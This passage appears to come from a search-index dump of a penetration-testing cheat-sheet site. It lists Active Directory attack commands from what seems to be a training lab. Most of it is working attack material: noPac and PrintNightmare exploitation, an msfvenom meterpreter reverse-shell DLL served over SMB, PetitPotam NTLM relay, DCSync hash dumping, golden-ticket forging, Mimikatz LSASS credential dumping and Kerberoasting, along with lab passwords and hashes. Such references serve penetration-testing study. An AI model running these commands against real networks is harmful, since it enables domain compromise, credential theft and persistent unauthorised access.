-ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"</code> PowerView based tool to used to enumerate the <code>Remote Desktop Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.   <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"</code> PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.   <code>$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force</code> Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host.   <code>$cred = new-object System.Management.Automation.PSCredential (\"LEGALCORP\\forend\", $password)</code> Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host.   <code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code> Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>).   <code>evil-winrm -i 10.129.201.234 -u forend</code> Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>.   <code>Import-Module .\\PowerUpSQL.ps1</code> Used to import the <code>PowerUpSQL</code> tool.   <code>Get-SQLInstanceDomain</code> PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.   <code>Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"LEGALCORP\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'</code> PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query 'Select @@version'</code>) from a Windows-based host.   <code>mssqlclient.py</code> Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host.   <code>mssqlclient.py LEGALCORP/DAMUNDSEN@172.16.5.150 -windows-auth</code> Impacket tool used to connect to a MSSQL server from a Linux-based host.   <code>SQL&gt; help</code> Used to display mssqlclient.py options once connected to a MSSQL server.   <code>SQL&gt; enable_xp_cmdshell</code> Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host.   <code>xp_cmdshell whoami /priv</code> Used to enumerate rights on a system using <code>xp_cmdshell</code>.","title":"Privileged Access"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#nopac","text":"Command Description     <code>sudo git clone https://github.com/Ridter/noPac.git</code> Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host.   <code>sudo python3 scanner.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code> Runs <code>scanner.py</code> to check if a target system is vulnerable to <code>noPac</code>/<code>Sam_The_Admin</code> from a Linux-based host.   <code>sudo python3 noPac.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code> Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>  vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host.   <code>sudo python3 noPac.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user LEGALCORP/administrator</code> Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>  vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host.","title":"NoPac"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#printnightmare","text":"Command Description     <code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code> Used to clone a PrintNightmare exploit  using git from a Linux-based host.   <code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code> Used to ensure the exploit author's (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.   <code>rpcdump.py @172.16.5.5 \\| egrep 'MS-RPRN\\|MS-PAR'</code> Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host.   <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code> Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.   <code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code> Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.   <code>sudo python3 CVE-2021-1675.py legalcorp.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 '\\\\10.129.202.111\\CompData\\backupscript.dll'</code> Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.","title":"PrintNightmare"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#petitpotam","text":"Command Description     <code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.legalcorp.local/certsrv/certfnsh.asp --adcs --template DomainController</code> Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host.   <code>git clone https://github.com/topotam/PetitPotam.git</code> Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host.   <code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code> Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host.   <code>python3 /opt/PKINITtools/gettgtpkinit.py legalcorp.local/ACADEMY-EA-DC01\\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code> Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host.   <code>secretsdump.py -just-dc-user LEGALCORP/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.legalcorp.local</code> Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host.   <code>klist</code> <code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host.   <code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 legalcorp.local/ACADEMY-EA-DC01$</code> Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host.   <code>secretsdump.py -just-dc-user LEGALCORP/administrator \"ACADEMY-EA-DC01$\"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code> Impacket tool used to extract hashes from <code>NTDS.dit</code> using a <code>DCSync attack</code> and a captured hash (<code>-hashes</code>). Performed from a Linux-based host.   <code>.\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code> Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host.   <code>mimikatz # lsadump::dcsync /user:LEGALCORP\\krbtgt</code> Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host.","title":"PetitPotam"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#miscellaneous-misconfigurations","text":"Command Description     <code>Import-Module .\\SecurityAssessment.ps1</code> Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host.   <code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.legalcorp.local</code> SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host.   <code>adidnsdump -u LEGALCORP\\\\forend ldap://172.16.5.5</code> Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host.   <code>adidnsdump -u LEGALCORP\\\\forend ldap://172.16.5.5 -r</code> Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host.   <code>Get-DomainUser * \\| Select-Object samaccountname,description</code> PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.   <code>Get-DomainUser -UACFilter PASSWD_NOTREQD \\| Select-Object samaccountname,useraccountcontrol</code> PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.   <code>ls \\\\academy-ea-dc01\\SYSVOL\\legalcorp.local\\scripts</code> Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.","title":"Miscellaneous Misconfigurations"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#group-policy-enumeration-attacks","text":"Command Description     <code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code> Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host.   <code>crackmapexec smb -L \\| grep gpp</code> Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host.   <code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code> Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host.   <code>Get-DomainGPO \\| select displayname</code> PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.   <code>Get-GPO -All \\| Select DisplayName</code> PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.   <code>$sid=Convert-NameToSid \"Domain Users\"</code> Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host.   <code>Get-DomainGPO \\| Get-ObjectAcl \\| ?{$_.SecurityIdentifier -eq $sid</code> PowerView tool that is used to check if the <code>Domain Users</code>  (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host.   <code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code> PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host.","title":"Group Policy Enumeration &amp; Attacks"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#asreproasting","text":"Command Description     <code>Get-DomainUser -PreauthNotRequired \\| select samaccountname,userprincipalname,useraccountcontrol \\| fl</code> PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host.   <code>.\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code> Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host.   <code>hashcat -m 18200 lcorp_asrep /usr/share/wordlists/rockyou.txt</code> Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host.   <code>kerbrute userenum -d legalcorp.local --dc 172.16.5.5 /opt/jsmith.txt</code> Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.","title":"ASREPRoasting"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#trust-relationships-child-parent-trusts","text":"Command Description     <code>Import-Module activedirectory</code> Used to import the <code>Active Directory</code> module. Performed from a Windows-based host.   <code>Get-ADTrust -Filter *</code> PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.   <code>Get-DomainTrust</code> PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.   <code>Get-DomainTrustMapping</code> PowerView tool used to perform a domain trust mapping from a Windows-based host.   <code>Get-DomainUser -Domain LOGISTICS.legalcorp.local \\| select SamAccountName</code> PowerView tools used to enumerate users in a target child domain from a Windows-based host.   <code>mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt</code> Uses Mimikatz to obtain the <code>KRBTGT</code> account's <code>NT Hash</code> from a Windows-based host.   <code>Get-DomainSID</code> PowerView tool used to get the SID for a target child domain from a Windows-based host.   <code>Get-DomainGroup -Domain legalcorp.local -Identity \"Enterprise Admins\" \\| select distinguishedname,objectsid</code> PowerView tool used to obtain the <code>Enterprise Admins</code> group's SID from a Windows-based host.   <code>ls \\\\academy-ea-dc01.legalcorp.local\\c$</code> Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.   <code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.legalcorp.local /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code> Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host .   <code>.\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.legalcorp.local /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code> Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host.   <code>mimikatz # lsadump::dcsync /user:LEGALCORP\\lab_adm</code> Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host.   <code>secretsdump.py logistics.legalcorp.local/user_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code> Impacket tool used to perform a DCSync attack from a Linux-based host.   <code>lookupsid.py logistics.legalcorp.local/user_adm@172.16.5.240</code> Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host.   <code>lookupsid.py logistics.legalcorp.local/user_adm@172.16.5.240 \\| grep \"Domain SID\"</code> Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.   <code>lookupsid.py logistics.legalcorp.local/user_adm@172.16.5.5 \\| grep -B12 \"Enterprise Admins\"</code> Impacket tool used to retrieve the <code>SID</code> of a target Windows domain and attach it to the Enterprise Admin group's <code>RID</code> from a Linux-based host.   <code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.legalcorp.local -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code> Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host.   <code>export KRB5CCNAME=hacker.ccache</code> Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host.   <code>psexec.py LOGISTICS.legalcorp.local/hacker@academy-ea-dc01.legalcorp.local -k -no-pass -target-ip 172.16.5.5</code> Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.   <code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.legalcorp.local/user_adm</code> Impacket tool that automatically performs an attack that escalates from child to parent domain.","title":"Trust Relationships - Child &gt; Parent Trusts"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/#trust-relationships-cross-forest","text":"Command Description     <code>Get-DomainUser -SPN -Domain LEGALLOGISTICS.LOCAL \\| select SamAccountName</code> PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host.   <code>Get-DomainUser -Domain LEGALLOGISTICS.LOCAL -Identity mssqlsvc \\| select samaccountname,memberof</code> PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host.   <code>.\\Rubeus.exe kerberoast /domain:LEGALLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code> Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:LEGALLOGISTICS.local</code>) from a Windows-based host.   <code>Get-DomainForeignGroupMember -Domain LEGALLOGISTICS.LOCAL</code> PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.   <code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL -Credential LEGALCORP\\administrator</code> PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.   <code>GetUserSPNs.py -request -target-domain LEGALLOGISTICS.LOCAL legalcorp.local/wley</code> Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host.   <code>bloodhound-python -d legalcorp.local -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code> Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host.   <code>zip -r lcorp_bh.zip *.json</code> Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI.","title":"Trust Relationships - Cross-Forest"},{"location":"cheat_sheets/active_directory/exploitation/","text":"Active Directory Exploitation Cheat Sheet","title":"Exploitation"},{"location":"cheat_sheets/active_directory/exploitation/#summary","text":"<ul> <li>Summary</li> <li>Tools</li> <li>Domain Enumeration</li> <li>Using PowerView</li> <li>Using AD Module</li> <li>Using BloodHound<ul> <li>Remote BloodHound</li> <li>On Site BloodHound</li> </ul> </li> <li>Useful Enumeration Tools</li> <li>Local Privilege Escalation</li> <li>Useful Local Priv Esc Tools</li> <li>Lateral Movement</li> <li>PowerShell Remoting</li> <li>Remote Code Execution with PS Credentials</li> <li>Import a PowerShell Module and Execute its Functions Remotely</li> <li>Executing Remote Stateful commands</li> <li>Mimikatz</li> <li>Remote Desktop Protocol</li> <li>URL File Attacks</li> <li>Useful Tools</li> <li>Domain Privilege Escalation</li> <li>Kerberoast</li> <li>ASREPRoast</li> <li>Password Spray Attack</li> <li>Force Set SPN</li> <li>Abusing Shadow Copies</li> <li>List and Decrypt Stored Credentials using Mimikatz</li> <li>Unconstrained Delegation</li> <li>Constrained Delegation</li> <li>Resource Based Constrained Delegation</li> <li>DNSAdmins Abuse</li> <li>Abusing Active Directory-Integraded DNS</li> <li>Abusing Backup Operators Group</li> <li>Abusing Exchange</li> <li>Weaponizing Printer Bug</li> <li>Abusing ACLs</li> <li>Abusing IPv6 with mitm6</li> <li>SID History Abuse</li> <li>Exploiting SharePoint</li> <li>Zerologon</li> <li>PrintNightmare</li> <li>Active Directory Certificate Services</li> <li>No PAC</li> <li>Domain Persistence</li> <li>Golden Ticket Attack</li> <li>DCsync Attack</li> <li>Silver Ticket Attack</li> <li>Skeleton Key Attack</li> <li>DSRM Abuse</li> <li>Custom SSP</li> <li>Cross Forest Attacks</li> <li>Trust Tickets</li> <li>Abuse MSSQL Servers</li> <li>Breaking Forest Trusts</li> </ul>","title":"Summary"},{"location":"cheat_sheets/active_directory/exploitation/#tools","text":"<ul> <li>Powersploit</li> <li>PowerUpSQL</li> <li>Powermad</li> <li>Impacket</li> <li>Mimikatz</li> <li>Rubeus -&gt; Compiled Version</li> <li>BloodHound</li> <li>AD Module</li> <li>ASREPRoast</li> </ul>","title":"Tools"},{"location":"cheat_sheets/active_directory/exploitation/#domain-enumeration","text":"","title":"Domain Enumeration"},{"location":"cheat_sheets/active_directory/exploitation/#using-powerview","text":"<p>Powerview v.3.0 Powerview Wiki</p> <ul> <li>Get Current Domain: <code>Get-Domain</code></li> <li>Enumerate Other Domains: <code>Get-Domain -Domain &lt;DomainName&gt;</code></li> <li>Get Domain SID: <code>Get-DomainSID</code></li> <li>Get Domain Policy:</li> </ul> <pre><code>Get-DomainPolicy\n\n#Will show us the policy configurations of the Domain about system access or kerberos\nGet-DomainPolicy | Select-Object -ExpandProperty SystemAccess\nGet-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy\n</code></pre> <ul> <li>Get Domain Controllers: <pre><code>Get-DomainController\nGet-DomainController -Domain &lt;DomainName&gt;\n</code></pre></li> <li>Enumerate Domain Users:</li> </ul> <pre><code>#Save all Domain Users to a file\nGet-DomainUser | Out-File -FilePath .\\DomainUsers.txt\n\n#Will return specific properties of a specific user\nGet-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List\n\n#Enumerate user logged on a machine\nGet-NetLoggedon -ComputerName &lt;ComputerName&gt;\n\n#Enumerate Session Information for a machine\nGet-NetSession -ComputerName &lt;ComputerName&gt;\n\n#Enumerate domain machines of the current/specified domain where specific users are logged into\nFind-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName\n</code></pre> <ul> <li>Enum Domain Computers:</li> </ul> <pre><code>Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName\n\n#Enumerate Live machines\nGet-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName\n</code></pre> <ul> <li>Enum Groups and Group Members:</li> </ul> <pre><code>#Save all Domain Groups to a file:\nGet-DomainGroup | Out-File -FilePath .\\DomainGroup.txt\n\n#Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins)\nGet-DomainGroup -Identity '&lt;GroupName&gt;' | Select-Object -ExpandProperty Member\nGet-DomainGroupMember -Identity '&lt;GroupName&gt;' | Select-Object MemberDistinguishedName\n\n#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine\nGet-NetLocalGroup | Select-Object GroupName\n\n#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine\nGet-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain\n\n#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences\nGet-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName\n</code></pre> <ul> <li>Enumerate Shares:</li> </ul> <pre><code>#Enumerate Domain Shares\nFind-DomainShare\n\n#Enumerate Domain Shares the current user has access\nFind-DomainShare -CheckShareAccess\n\n#Enumerate \"Interesting\" Files on accessible shares\nFind-InterestingDomainShareFile -Include *passwords*\n</code></pre> <ul> <li>Enum Group Policies:</li> </ul> <pre><code>Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName\n\n#Enumerate all GPOs to a specific computer\nGet-DomainGPO -ComputerIdentity &lt;ComputerName&gt; -Properties DisplayName | Sort-Object -Property DisplayName\n\n#Get users that are part of a Machine's local Admin group\nGet-DomainGPOComputerLocalGroupMapping -ComputerName &lt;ComputerName&gt;\n</code></pre> <ul> <li>Enum OUs: <pre><code>Get-DomainOU -Properties Name | Sort-Object -Property Name\n</code></pre></li> <li>Enum ACLs:</li> </ul> <pre><code># Returns the ACLs associated with the specified account\nGet-DomaiObjectAcl -Identity &lt;AccountName&gt; -ResolveGUIDs\n\n#Search for interesting ACEs\nFind-InterestingDomainAcl -ResolveGUIDs\n\n#Check the ACLs associated with a specified path (e.g smb share)\nGet-PathAcl -Path \"\\\\Path\\Of\\A\\Share\"\n</code></pre> <ul> <li>Enum Domain Trust:</li> </ul> <pre><code>Get-DomainTrust\nGet-DomainTrust -Domain &lt;DomainName&gt;\n\n#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds\nGet-DomainTrustMapping\n</code></pre> <ul> <li>Enum Forest Trust:</li> </ul> <pre><code>Get-ForestDomain\nGet-ForestDomain -Forest &lt;ForestName&gt;\n\n#Map the Trust of the Forest\nGet-ForestTrust\nGet-ForestTrust -Forest &lt;ForestName&gt;\n</code></pre> <ul> <li>User Hunting:</li> </ul> <pre><code>#Finds all machines on the current domain where the current user has local admin access\nFind-LocalAdminAccess -Verbose\n\n#Find local admins on all machines of the domain\nFind-DomainLocalGroupMember -Verbose\n\n#Find computers were a Domain Admin OR a spesified user has a session\nFind-DomainUserLocation | Select-Object UserName, SessionFromName\n\n#Confirming admin access\nTest-AdminAccess\n</code></pre> <p>Priv Esc to Domain Admin with User Hunting:   I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt; Profit!</p>","title":"Using PowerView"},{"location":"cheat_sheets/active_directory/exploitation/#using-ad-module","text":"<ul> <li>Get Current Domain: <code>Get-ADDomain</code></li> <li>Enum Other Domains: <code>Get-ADDomain -Identity &lt;Domain&gt;</code></li> <li>Get Domain SID: <code>Get-DomainSID</code></li> <li>Get Domain Controlers:</li> </ul> <pre><code>Get-ADDomainController\nGet-ADDomainController -Identity &lt;DomainName&gt;\n</code></pre> <ul> <li>Enumerate Domain Users:</li> </ul> <pre><code>Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *\n\n#Get a spesific \"string\" on a user's attribute\nGet-ADUser -Filter 'Description -like \"*wtver*\"' -Properties Description | select Name, Description\n</code></pre> <ul> <li>Enum Domain Computers: <pre><code>Get-ADComputer -Filter * -Properties *\nGet-ADGroup -Filter *\n</code></pre></li> <li>Enum Domain Trust: <pre><code>Get-ADTrust -Filter *\nGet-ADTrust -Identity &lt;DomainName&gt;\n</code></pre></li> <li>Enum Forest Trust:</li> </ul> <pre><code>Get-ADForest\nGet-ADForest -Identity &lt;ForestName&gt;\n\n#Domains of Forest Enumeration\n(Get-ADForest).Domains\n</code></pre> <ul> <li>Enum Local AppLocker Effective Policy:</li> </ul> <pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre>","title":"Using AD Module"},{"location":"cheat_sheets/active_directory/exploitation/#using-bloodhound","text":"","title":"Using BloodHound"},{"location":"cheat_sheets/active_directory/exploitation/#remote-bloodhound","text":"<p>Python BloodHound Repository or install it with <code>pip3 install bloodhound</code></p> <pre><code>bloodhound-python -u &lt;UserName&gt; -p &lt;Password&gt; -ns &lt;Domain Controller's Ip&gt; -d &lt;Domain&gt; -c All\n</code></pre>","title":"Remote BloodHound"},{"location":"cheat_sheets/active_directory/exploitation/#on-site-bloodhound","text":"<pre><code>#Using exe ingestor\n.\\SharpHound.exe --CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --domain &lt;Domain&gt; --domaincontroller &lt;Domain Controller's Ip&gt; --OutputDirectory &lt;PathToFile&gt;\n\n#Using PowerShell module ingestor\n. .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --OutputDirectory &lt;PathToFile&gt;\n</code></pre>","title":"On Site BloodHound"},{"location":"cheat_sheets/active_directory/exploitation/#useful-enumeration-tools","text":"<ul> <li>ldapdomaindump Information dumper via LDAP</li> <li>adidnsdump Integrated DNS dumping by any authenticated user</li> <li>ACLight Advanced Discovery of Privileged Accounts</li> <li>ADRecon Detailed Active Directory Recon Tool</li> </ul>","title":"Useful Enumeration Tools"},{"location":"cheat_sheets/active_directory/exploitation/#local-privilege-escalation","text":"<ul> <li> <p>Windows Privilege Escalation CheatSheet Cheat Sheet for Windows Local Privilege Escalations</p> </li> <li> <p>Juicy Potato Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation</p> </li> </ul> <p> Works only until Windows Server 2016 and Windows 10 until patch 1803</p> <ul> <li>Lovely Potato Automated Juicy Potato</li> </ul> <p> Works only until Windows Server 2016 and Windows 10 until patch 1803</p> <ul> <li>PrintSpoofer Exploit the PrinterBug for System Impersonation</li> </ul> <p> Works for Windows Server 2019 and Windows 10</p> <ul> <li>RoguePotato Upgraded Juicy Potato</li> </ul> <p> Works for Windows Server 2019 and Windows 10</p> <ul> <li>Abusing Token Privileges</li> <li>SMBGhost CVE-2020-0796 \\   PoC</li> <li>CVE-2021-36934 (HiveNightmare/SeriousSAM)</li> </ul>","title":"Local Privilege Escalation"},{"location":"cheat_sheets/active_directory/exploitation/#useful-local-priv-esc-tools","text":"<ul> <li>PowerUp Misconfiguration Abuse</li> <li>BeRoot General Priv Esc Enumeration Tool</li> <li>Privesc General Priv Esc Enumeration Tool</li> <li>FullPowers Restore A Service Account's Privileges</li> </ul>","title":"Useful Local Priv Esc Tools"},{"location":"cheat_sheets/active_directory/exploitation/#lateral-movement","text":"","title":"Lateral Movement"},{"location":"cheat_sheets/active_directory/exploitation/#powershell-remoting","text":"<pre><code>#Enable PowerShell Remoting on current Machine (Needs Admin Access)\nEnable-PSRemoting\n\n#Entering or Starting a new PSSession (Needs Admin Access)\n$sess = New-PSSession -ComputerName &lt;Name&gt;\nEnter-PSSession -ComputerName &lt;Name&gt; OR -Sessions &lt;SessionName&gt;\n</code></pre>","title":"PowerShell Remoting"},{"location":"cheat_sheets/active_directory/exploitation/#remote-code-execution-with-ps-credentials","text":"<pre><code>$SecPassword = ConvertTo-SecureString '&lt;Wtver&gt;' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('xyz.local\\&lt;WtverUser&gt;', $SecPassword)\nInvoke-Command -ComputerName &lt;WtverMachine&gt; -Credential $Cred -ScriptBlock {whoami}\n</code></pre>","title":"Remote Code Execution with PS Credentials"},{"location":"cheat_sheets/active_directory/exploitation/#import-a-powershell-module-and-execute-its-functions-remotely","text":"<pre><code>#Execute the command and start a session\nInvoke-Command -Credential $cred -ComputerName &lt;NameOfComputer&gt; -FilePath c:\\FilePath\\file.ps1 -Session $sess\n\n#Interact with the session\nEnter-PSSession -Session $sess\n</code></pre>","title":"Import a PowerShell Module and Execute its Functions Remotely"},{"location":"cheat_sheets/active_directory/exploitation/#executing-remote-stateful-commands","text":"<pre><code>#Create a new session\n$sess = New-PSSession -ComputerName &lt;NameOfComputer&gt;\n\n#Execute command on the session\nInvoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}\n\n#Check the result of the command to confirm we have an interactive session\nInvoke-Command -Session $sess -ScriptBlock {$ps}\n</code></pre>","title":"Executing Remote Stateful commands"},{"location":"cheat_sheets/active_directory/exploitation/#mimikatz","text":"<pre><code>#The commands are in cobalt strike format!\n\n#Dump LSASS:\nmimikatz privilege::debug\nmimikatz token::elevate\nmimikatz sekurlsa::logonpasswords\n\n#(Over) Pass The Hash\nmimikatz privilege::debug\nmimikatz sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;&gt; /domain:&lt;DomainFQDN&gt;\n\n#List all available kerberos tickets in memory\nmimikatz sekurlsa::tickets\n\n#Dump local Terminal Services credentials\nmimikatz sekurlsa::tspkg\n\n#Dump and save LSASS in a file\nmimikatz sekurlsa::minidump 